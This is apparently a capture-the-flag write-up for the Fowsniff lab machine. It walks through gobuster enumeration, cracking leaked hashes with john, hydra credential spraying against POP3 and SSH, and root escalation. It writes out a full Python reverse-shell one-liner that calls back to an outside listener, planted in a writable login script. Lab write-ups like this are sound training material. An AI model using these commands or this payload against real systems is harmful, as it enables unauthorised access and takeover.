Fowsniff

Target IP: 192.168.186.18

Scanning


There are four TCP ports open on the target machine: SSH, HTTP, POP3, and IMAP. I will begin enumeration with HTTP application.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application. The source-code of this page does not reveal anything useful.


Running gobuster dir -u http://192.168.186.18/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt shows the interesting result above.


The message shown above has been left by the attacker. Apparently the hacker's name is B1gN1nj4!. Maybe it's a username I can use for the different applications? After performing enumeration on the different directories, I did not find anything useful.


The website mentions their Twitter account @fowsniffcorp was taken over by the attacker. I managed to find the pastebin tweet left by the attacker. This pastebin contains the username and password hash of nine user accounts. I saved this information in a file called hash.


The format of the hash looks like raw md5. And then I ran john to decrypt the password hash of each user. And this came out successful! The website does not provide any login; therefore, I can spray these credentials against the different port applications.


I saved all the credentials in a file called credentials. I can use hydra to bruteforce against SSH, IMAP, and POP3 using this file.

Port 110: POP3

Spraying the credentials above did not work for SSH; however, it did work for the POP3 and SMTP with the same login!


After logging into the POP3 server as seina, I notice there are two emails left for her.


The first email contains the message above. A temporary password of S1ck3nBluff+secureshell has been set for the SSH.


The second email content is shown above.

Port 22: SSH
Now we have the usernames of nine users and the temporary password for the SSH. There must be at least one user who has not changed this password. Time to spray this temporary password against SSH using the nine usernames.


I created a file called usernames to store the nine usernames.


Running hydra -L usernames -p S1ck3nBluff+secureshell ssh://192.168.186.18 -t 4 shows the user baksteen has not changed this temporary password for SSH!

Exploitation


And now I have a foothold on the machine as baksteen using SSH.

Privilege Escalation


Running uname -a shows this host is vulnerable to CVE-2017-16995, but gcc is not installed.
LinPeas shows an interesting file called cube.sh. This artwork gets displayed when a successful login is made using SSH.


Looks like I can make changes to this file. I wonder if I can put a reverse shell script inside this file.


Python3 payload used: python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.195",8444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'. I inserted the payload at the bottom of the file using vim.


I started a listener on port 8444, exited the SSH session as baksteen, logged back in, and gained a root shell on port 8444.

Flags


The local.txt and proof.txt flags. Gaining a root shell was fun for this challenge.
